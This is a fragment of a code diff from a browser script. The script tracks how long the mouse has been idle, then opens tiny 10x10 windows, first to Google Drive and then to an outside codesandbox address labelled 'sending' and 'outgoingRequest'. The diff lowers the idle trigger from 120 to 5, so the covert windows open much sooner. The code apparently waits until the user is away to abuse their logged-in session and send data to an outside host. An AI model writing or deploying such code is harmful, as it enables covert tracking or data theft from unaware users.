@@ -16,7 +16,7 @@ function main() {
       }
     };
     window.lastTimeMouseWasMoved += 0.1;
-    if (window.lastTimeMouseWasMoved > 120) {
+    if (window.lastTimeMouseWasMoved > 5) {
       var myWindow = window.open("https://drive.google.com", "myWindow", "width=10,height=10");
       setTimeout(() => {
         var outgoingRequest = window.open("https://dqvznw.sse.codesandbox.io/", "sending", "width=10,height=10");
